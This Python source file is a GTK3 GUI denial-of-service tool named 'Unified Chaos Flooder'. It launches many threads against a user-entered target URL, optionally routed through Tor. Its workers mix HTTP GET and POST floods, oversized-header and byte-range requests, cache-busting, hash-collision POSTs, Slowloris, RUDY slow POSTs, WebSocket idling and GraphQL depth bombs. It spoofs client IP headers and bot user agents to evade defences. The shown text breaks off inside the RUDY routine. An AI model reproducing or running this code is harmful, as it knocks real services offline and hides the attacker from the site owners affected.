import gi
import threading
import time
import random
import string
import requests
import socket
from collections import defaultdict

# optional extra dependency ----------------------------------------------------
try:
    import websocket  # websocket-client >= 1.6.0
    HAVE_WS = True
except ImportError:
    HAVE_WS = False

# -----------------------------------------------------------------------------
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GLib


class ChaosFlooder(Gtk.Application):
    """GTK3 GUI that bundles multiple L7 attack techniques in one binary.
    This version:
    • Batches status updates once per second to keep the UI responsive.
    • Auto‑scrolls the log window to the newest line.
    """

    # --------------------------- GTK Boiler-plate ----------------------------
    def __init__(self):
        super().__init__()
        self.flooding = False
        self.total_requests = 0
        self.total_errors = 0
        self.attack_counts = defaultdict(int)

        # fire a timer that updates status once a second
        GLib.timeout_add_seconds(1, self._periodic_status)

    def do_activate(self):
        window = Gtk.ApplicationWindow(application=self)
        window.set_title("UNIFIED CHAOS FLOODER – v2.1")
        window.set_default_size(680, 500)
        window.connect("destroy", Gtk.main_quit)

        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8, margin=12)

        # target + options
        self.url_entry = Gtk.Entry()
        self.url_entry.set_placeholder_text("Target URL (e.g., http://192.168.1.1)")
        box.pack_start(self.url_entry, False, False, 0)

        self.threads_entry = Gtk.Entry()
        self.threads_entry.set_placeholder_text("Number of Threads (e.g., 200)")
        box.pack_start(self.threads_entry, False, False, 0)

        self.use_tor_check = Gtk.CheckButton(label="Route via Tor (localhost:9150)")
        box.pack_start(self.use_tor_check, False, False, 0)

        # buttons
        button_box = Gtk.Box(spacing=6)
        start_button = Gtk.Button(label="🚀 START FLOOD")
        start_button.connect("clicked", self.start_flood)
        button_box.pack_start(start_button, True, True, 0)

        stop_button = Gtk.Button(label="🛑 STOP")
        stop_button.connect("clicked", self.stop_flood)
        button_box.pack_start(stop_button, True, True, 0)
        box.pack_start(button_box, False, False, 0)

        # log view
        self.log_buffer = Gtk.TextBuffer()
        self.log_view = Gtk.TextView(buffer=self.log_buffer)
        self.log_view.set_editable(False)
        self.log_view.set_wrap_mode(Gtk.WrapMode.WORD_CHAR)
        self.scrolled = Gtk.ScrolledWindow()
        self.scrolled.set_vexpand(True)
        self.scrolled.add(self.log_view)
        box.pack_start(self.scrolled, True, True, 0)

        window.add(box)
        window.show_all()

    # ----------------------------- UI helpers --------------------------------
    def log(self, text: str) -> None:
        end_iter = self.log_buffer.get_end_iter()
        self.log_buffer.insert(end_iter, text + "\n")
        # auto‑scroll to bottom
        mark = self.log_buffer.create_mark("end", self.log_buffer.get_end_iter(), True)
        self.log_view.scroll_to_mark(mark, 0.05, True, 0.0, 1.0)

    # called once per second by GLib mainloop
    def _periodic_status(self):
        if self.total_requests == self.total_errors == 0:
            return True  # nothing yet, keep timer
        status = (
            f"Requests: {self.total_requests} | Errors: {self.total_errors} | "
            + ", ".join(f"{k}:{v}" for k, v in self.attack_counts.items())
        )
        self.log(status)
        return True  # keep timer running

    # ------------------------- Flooder lifecycle -----------------------------
    def start_flood(self, _btn):
        if self.flooding:
            return

        target = self.url_entry.get_text().strip()
        if not target:
            self.log("❌ Enter a target URL first.")
            return

        try:
            num_threads = int(self.threads_entry.get_text())
            if num_threads < 1:
                raise ValueError
        except ValueError:
            self.log("❌ Invalid thread count.")
            return

        # reset state
        self.flooding = True
        self.total_requests = 0
        self.total_errors = 0
        self.attack_counts.clear()

        self.base_url = target.rstrip("/")
        self.use_tor = self.use_tor_check.get_active()

        for _ in range(num_threads):
            th = threading.Thread(target=self.chaos_worker, daemon=True)
            th.start()

        self.log(f"🔥 CHAOS FLOOD STARTED with {num_threads} threads …")

    def stop_flood(self, _btn):
        self.flooding = False
        self.log("🛑 CHAOS FLOOD STOPPED.")

    # ---------------------------- Core worker --------------------------------
    def chaos_worker(self):
        session = requests.Session()
        if self.use_tor:
            session.proxies = {
                "http": "socks5h://127.0.0.1:9150",
                "https": "socks5h://127.0.0.1:9150",
            }

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "curl/7.88.1",
            "Wget/1.21.3",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Bingbot/2.0",
            "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            "Twitterbot/1.0",
            "Mozilla/5.0 (Linux; Android 14)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)",
        ]

        attacks = [
            "GET",
            "POST",
            "GARBAGE",
            "SLOWLORIS",
            "MALFORMED",
            "RANGE",
            "RUDY",
            "HASHDOS",
            "CACHEBUSTER",
        ]
        if HAVE_WS:
            attacks.append("WS_IDLE")
        attacks.append("GRAPHQL")  # will no-op if /graphql 404s

        while self.flooding:
            try:
                attack = random.choice(attacks)
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "X-Forwarded-For": self._rand_ip(),
                    "X-Real-IP": self._rand_ip(),
                    "Referer": f"http://{self._rand_str(6)}.com/",
                    "Connection": "keep-alive",
                }

                # Each attack supplies its own path (some overwrite full_url):
                path = "/" + self._rand_str(10)
                full_url = self.base_url + path

                if attack == "GET":
                    session.get(full_url, headers=headers, timeout=4)
                    self._bump("GET")

                elif attack == "POST":
                    data = {self._rand_str(5): self._rand_str(8) for _ in range(4)}
                    session.post(full_url, headers=headers, data=data, timeout=4)
                    self._bump("POST")

                elif attack == "GARBAGE":  # 404 hammer
                    garbage_path = "/" + self._rand_str(24)
                    session.get(self.base_url + garbage_path, headers=headers, timeout=4)
                    self._bump("404")

                elif attack == "MALFORMED":  # header explosion
                    big_headers = headers.copy()
                    for i in range(30):
                        big_headers[f"X-Blob-{i:02d}"] = self._rand_str(4096)
                    session.get(full_url, headers=big_headers, timeout=4)
                    self._bump("HDR_EXP")

                elif attack == "RANGE":
                    range_headers = headers.copy()
                    range_headers["Range"] = "bytes=" + ",".join(
                        f"{i}-{i}" for i in range(0, 4096, 4)
                    )
                    session.get(full_url, headers=range_headers, timeout=4)
                    self._bump("RANGE")

                elif attack == "CACHEBUSTER":
                    cb_url = f"{full_url}?nocache={self._rand_str(12)}"
                    session.get(cb_url, headers=headers, timeout=4)
                    self._bump("CACHE")

                elif attack == "HASHDOS":
                    if not hasattr(self, "_hash_body"):
                        collisions = ["Aa" * i for i in range(1, 5001)]
                        self._hash_body = {k: "1" for k in collisions}
                    session.post(full_url, headers=headers, data=self._hash_body, timeout=4)
                    self._bump("HASHDOS")

                elif attack == "SLOWLORIS":
                    self._slowloris(self.base_url)
                    self._bump("SLOWLORIS")

                elif attack == "RUDY":
                    self._slow_post_rudy(self.base_url)
                    self._bump("RUDY")

                elif attack == "WS_IDLE" and HAVE_WS:
                    self._ws_idle(self.base_url)
                    self._bump("WS_IDLE")

                elif attack == "GRAPHQL":
                    self._graphql_depth_bomb(session, headers)
                    self._bump("GQL")

            except Exception as exc:
                self.total_errors += 1
                GLib.idle_add(self.log, f"⚠︎ {type(exc).__name__}: {exc}")

    # --------------------------- helper methods -----------------------------
    def _bump(self, tag: str):
        self.total_requests += 1
        self.attack_counts[tag] += 1

    def _rand_str(self, n: int) -> str:
        return "".join(random.choices(string.ascii_letters + string.digits, k=n))

    def _rand_ip(self) -> str:
        return ".".join(str(random.randint(1, 255)) for _ in range(4))

    # ---------------------- Individual attack helpers -----------------------
    def _slowloris(self, target: str):
        """Classic Slowloris: open socket, send headers slowly, then close."""
        try:
            host, port, _ = self._parse_host(target)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(6)
            sock.connect((host, port))
            sock.sendall(f"GET /?{self._rand_str(6)} HTTP/1.1\r\n".encode())
            sock.sendall(f"Host: {host}\r\n".encode())
            for _ in range(20):
                if not self.flooding:
                    break
                sock.sendall(b"X-a: b\r\n")
                time.sleep(0.2)  # short sleep – releases GIL more often
            sock.close()
        except Exception:
            pass

    def _slow_post_rudy(self, target: str):
        """Send big Content-Length then drip the body (RUDY)."""
        try:
            host, port, _ = self._parse_host(target)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(6)
            sock.connect((host, port))
            sock.sendall(f"POST /?{self._rand_str(5)} HTTP/1.1\r\n".encode())
            sock.sendall(f"Host: {host}\r\n".encode())
            sock.sendall(b"User-Agent: chaos-rudy\r\n")
            sock.sendall(b"Content-Type: application/x-www-form-urlencoded\r\n")
            sock.sendall(b"Content-Length: 10000000\r\
